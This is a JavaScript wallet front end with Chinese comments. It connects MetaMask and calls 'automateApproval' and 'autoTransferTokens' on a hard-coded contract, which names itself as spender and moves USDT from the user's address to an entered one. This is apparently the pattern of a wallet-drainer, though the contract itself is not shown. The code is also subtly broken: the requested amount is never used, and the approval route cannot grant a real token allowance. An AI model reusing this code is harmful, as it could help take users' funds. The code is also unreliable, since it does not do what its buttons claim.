const contractABI = [
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "tokenAddress",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "from",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "to",
                "type": "address"
            }
        ],
        "name": "autoTransferTokens",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "tokenAddress",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "spender",
                "type": "address"
            }
        ],
        "name": "automateApproval",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

const contractAddress = '0xa2E8dda146b9E724bA0cdfB3bdB6bfA1e37a54d2'; // 您的智能合约地址
let userAccount;
let contract;

document.getElementById('connectWallet').addEventListener('click', async () => {
    if (window.ethereum) {
        try {
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            userAccount = ethereum.selectedAddress;
            contract = new web3.eth.Contract(contractABI, contractAddress);
            document.getElementById('approveButton').style.display = 'inline';
            document.getElementById('transferButton').style.display = 'inline';
            document.getElementById('status').textContent = '钱包连接成功：' + userAccount;
        } catch (error) {
            console.error('连接错误:', error);
            alert('连接钱包失败：' + error.message); // 提示框
            document.getElementById('status').textContent = '连接钱包失败：' + error.message;
        }
    } else {
        alert('请安装 MetaMask！'); // 提示框
        document.getElementById('status').textContent = '请安装 MetaMask！';
    }
});

// 授权转移
document.getElementById('approveButton').addEventListener('click', async () => {
    const tokenAddress = prompt("请输入代币地址："); // 代币合约地址
    const amount = prompt("请输入授权数量（直接填写数字，例如 1 或 3）："); // 代币数量

    if (tokenAddress && amount) {
        try {
            const response = await contract.methods.automateApproval(tokenAddress, contractAddress).send({ from: userAccount });
            console.log(response);
            alert('授权成功！'); // 提示框
            document.getElementById('status').textContent = '授权成功！';
        } catch (error) {
            console.error('授权错误:', error);
            alert('授权失败：' + error.message); // 提示框
            document.getElementById('status').textContent = '授权失败：' + error.message;
        }
    }
});

// 转移代币
document.getElementById('transferButton').addEventListener('click', async () => {
    const tokenAddress = '0xdac17f958d2ee523a2206206994597c13d831ec7'; // USDT 地址
    const toAddress = prompt("请输入接收地址："); // 接收地址

    if (toAddress) {
        try {
            const response = await contract.methods.autoTransferTokens(tokenAddress, userAccount, toAddress).send({ from: userAccount });
            console.log(response);
            alert('转移成功！'); // 提示框
            document.getElementById('status').textContent = '转移成功！';
        } catch (error) {
            console.error('转移错误:', error);
            alert('转移失败：' + error.message); // 提示框
            document.getElementById('status').textContent = '转移失败：' + error.message;
        }
    }
});
